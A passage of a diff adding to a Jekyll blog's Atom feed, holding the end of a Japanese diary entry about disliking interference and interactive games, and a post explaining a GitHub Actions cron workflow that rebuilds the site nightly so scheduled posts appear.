+&lt;p&gt;　私がいれば人は変化する。&lt;/p&gt;
+
+&lt;p&gt;　必要か不要かではなく、ただそうある。&lt;/p&gt;
+
+&lt;h2 id=&quot;干渉&quot;&gt;干渉&lt;/h2&gt;
+&lt;p&gt;　最近思うのだが、物事にあまり干渉したくない。&lt;/p&gt;
+
+&lt;p&gt;　干渉せずに鑑賞したい。&lt;/p&gt;
+
+&lt;p&gt;　いや、最近は鑑賞も少し厳しい。世界に触れたくないという感覚が押し寄せる時がある。&lt;/p&gt;
+
+&lt;p&gt;　知りたいことと知りたくないこと。&lt;/p&gt;
+
+&lt;p&gt;　時には、干渉したい時もある。干渉したい時というのは、その分野や対象や人に対して良い変化があると感じた時だ。この良い変化というのは主観で独断であり、実際にそうであるかは不明である。良くない変化を与えてしまう場合もある。環境問題で例えるなら生態系を変えてしまうということであり、普通に人と話す時でもその人の人生に影響を与えてしまうということを危惧してしまうようなものだ。敏感な時は異常なほど危惧してしまう。自分のことながら少々厄介だ。&lt;/p&gt;
+
+&lt;p&gt;　ともかく、干渉したり変化を与えてしまうことに嫌悪感がある。主体が自分である場合に限り。&lt;/p&gt;
+
+&lt;h2 id=&quot;インタラクティブ&quot;&gt;インタラクティブ&lt;/h2&gt;
+&lt;p&gt;　ゲームはインタラクティブなものである。&lt;/p&gt;
+
+&lt;p&gt;　つまりは、ゲーム世界に干渉して、ゲーム世界に変化を与えられる存在がプレイヤーだ。&lt;/p&gt;
+
+&lt;p&gt;　ゲームへの干渉もそれほど好きではない。&lt;/p&gt;
+
+&lt;p&gt;　その意味で、ゲームには不向きな性格なのかもしれない。&lt;/p&gt;
+
+&lt;p&gt;　とはいえ、ゲームには一定のゴールが存在する。&lt;/p&gt;
+
+&lt;p&gt;　マルチエンディングなどは少々苦手だが、ゴールが一つなら好きだ。&lt;/p&gt;
+
+&lt;p&gt;　あるいには、数えられる程度のゴール数ならまだ息が出来る。&lt;/p&gt;
+
+&lt;p&gt;　この話はネガティブなことしか言えなくなってしまう。何を言おうとも、それはゲームのインタラクティブ性への嫌悪感と言える。&lt;/p&gt;
+
+&lt;p&gt;　しかし、それが分かっていようとも、ゲームの仕組みは興味深いものであり、調べたくなるし、作ってみたくなるものである。&lt;/p&gt;
+
+&lt;p&gt;　いや、昔のゲームは殆ど一本道だったか。&lt;/p&gt;
+
+&lt;p&gt;　オープンワールドを始めとした出来ることの高さ、自分の行動が世界に及ぼす影響度の高低さ。&lt;/p&gt;
+
+&lt;p&gt;　これらが苦手なのだ。ゲームのインタラクティブ性の軸を高まる今風のゲームが苦手なのだ。&lt;/p&gt;
+
+&lt;p&gt;　ルール・ゴール・いくつかの操作があるだけで良いのだが。&lt;/p&gt;
+
+&lt;h2 id=&quot;はい&quot;&gt;はい&lt;/h2&gt;
+&lt;p&gt;　とりとめもないが、これでおわり。&lt;/p&gt;
+
+&lt;p&gt;　意味性も最近は億劫になりつつある。&lt;/p&gt;
+
+&lt;p&gt;　不条理という言葉が的確かは不明だが、不条理な方が良い。&lt;/p&gt;
+
+&lt;p&gt;　そう例えば、McPixel! のように。&lt;/p&gt;
+
+&lt;p&gt;　何か日記を書こうと思ったが、良い感じに脈絡のない日記になった。中々良い。こんな感じで続けて行きたい。&lt;/p&gt;
+
+&lt;p&gt;　この日記は一種のカウンセリングに近い可能性さえある。&lt;/p&gt;
+
+&lt;p&gt;　未来が楽しみだ。&lt;/p&gt;
+
+&lt;p&gt;　では。この辺で。
+　&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="diary" /></entry><entry><title type="html">記事の予約投稿2 自動ビルド</title><link href="/contents/tech/jekyll/2021/04/29/hello.html" rel="alternate" type="text/html" title="記事の予約投稿2 自動ビルド" /><published>2021-04-29T12:38:04+00:00</published><updated>2021-04-29T12:38:04+00:00</updated><id>/contents/tech/jekyll/2021/04/29/hello</id><content type="html" xml:base="/contents/tech/jekyll/2021/04/29/hello.html">&lt;h2 id=&quot;前回&quot;&gt;前回&lt;/h2&gt;
+&lt;p&gt;　記事の予約投稿機能を追加したわけだが、使ってみるとある問題があった。&lt;/p&gt;
+
+&lt;p&gt;　というのも、指定時刻を過ぎても記事への導線が作られない。&lt;/p&gt;
+
+&lt;p&gt;　なんでだろうと思ったが、実に単純な話で、これはビルドタイミングの話であったわけだ。&lt;/p&gt;
+
+&lt;h3 id=&quot;ビルド&quot;&gt;ビルド&lt;/h3&gt;
+&lt;p&gt;　標準では、リポジトリに push したタイミングでビルドが走る。つまり、この時の時間を基準にして静的ページを生成するため、未来の記事への導線は一生作られないということになる（ページは生成されているが、トップページなどでは一生導線が作られない）&lt;/p&gt;
+
+&lt;p&gt;　そこで、調べてみると、指定された時刻に自動ビルドするように変更出来ることが分かった。&lt;/p&gt;
+
+&lt;h3 id=&quot;github-action&quot;&gt;github action&lt;/h3&gt;
+&lt;p&gt;　github のページを開くと、どこかに github action とかいうのがある。仮に jekyll を使っていたならば、推奨機能として github action ページにてビルド設定の導入例を見ることが出来るだろう。&lt;/p&gt;
+
+&lt;h2 id=&quot;設定&quot;&gt;設定&lt;/h2&gt;
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.github/workflows/jekyll.yml&lt;/code&gt; というファイルを作る。&lt;/p&gt;
+
+&lt;p&gt;　内容は、以下のような感じ。&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Testing the GitHub Pages publication&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;branches&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;schedule&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cron&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;jobs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;jekyll&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ubuntu-16.04&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;actions/checkout@v2&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Use GitHub Actions' cache to shorten build times and decrease load on servers&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;actions/cache@v2&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;vendor/bundle&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${{ runner.os }}-gems-${{ hashFiles('**/Gemfile') }}&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;restore-keys&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
+          &lt;span class=&quot;s&quot;&gt;${{ runner.os }}-gems-&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Standard usage&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;helaili/jekyll-action@v2&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${{ secrets.GITHUB_TOKEN }}&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;target_branch&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gh-pages'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ブランチ構成&quot;&gt;ブランチ構成&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;master ブランチ
+    &lt;ul&gt;
+      &lt;li&gt;ここに普段のファイルを入れておく。_config.yml とかあるディレクトリ&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;gh-pages ブランチ
+    &lt;ul&gt;
+      &lt;li&gt;master で jekyll ビルドをして、その結果をこの gh-pages に格納する。&lt;/li&gt;
+      &lt;li&gt;github page で公開するブランチも gh-pages に設定しておくこと。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　元々は master を公開ブランチにしていたのだが、今回の記事の自動投稿のために、 gh-pages というブランチを新規に作成して、これを公開するようにした。つまり、ビルド済みのページを公開ブランチに設定したわけである。&lt;/p&gt;
+
+&lt;p&gt;　masterのまま出来ないかをいろいろ調べたり試したのだが、上手くいかなかった。上手くいったのはこの構成だった。&lt;/p&gt;
+
+&lt;h3 id=&quot;cron&quot;&gt;cron&lt;/h3&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cron&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　これはUTCで設定する必要がある。日本時間は UTC + 9 時間。この設定では 24時（深夜0時） に自動ビルドしてくれることになる。時間を設定する時はUTCにだけ注意しよう。&lt;/p&gt;
+
+&lt;h3 id=&quot;jekyll-action&quot;&gt;jekyll-action&lt;/h3&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;# Standard usage&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;helaili/jekyll-action@v2&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${{ secrets.GITHUB_TOKEN }}&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;target_branch&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gh-pages'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　ちょっと詳しくないのだが、誰かが作ってくれてたものっぽい。感謝。調べたら出てきます。上手く動かない人や実装が気になる方は調べるべし。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${{ secrets.GITHUB_TOKEN }}&lt;/code&gt; というのをどこかに設定しないといけないといった記事もあったが、それは古い情報で、現在はデフォルトでこの変数が存在していて使える。特に何も考えず、書いたら使えるので安心してほしい。&lt;/p&gt;
+
+&lt;h2 id=&quot;成果&quot;&gt;成果&lt;/h2&gt;
+&lt;p&gt;　深夜0時に自動ビルドしてくれるようになった。&lt;/p&gt;
+
+&lt;p&gt;　これで、予め未来の記事を投稿しておいたものが、毎日自動で公開される（私のサイトの場合は、記事への導線が出来るという話。URL叩けば未来の記事にもアクセスできる）&lt;/p&gt;
+
+&lt;p&gt;　良かった。設定ファイルをコミットして github action の動きを確認しないと行けなくて結構面倒だった。でも、こうして完成したらやっぱり非常に便利でやったかいがある。&lt;/p&gt;
+
+&lt;p&gt;　ブログがまた使いやすくなってしまった。はい。では、この辺で。&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="jekyll" /></entry></feed>
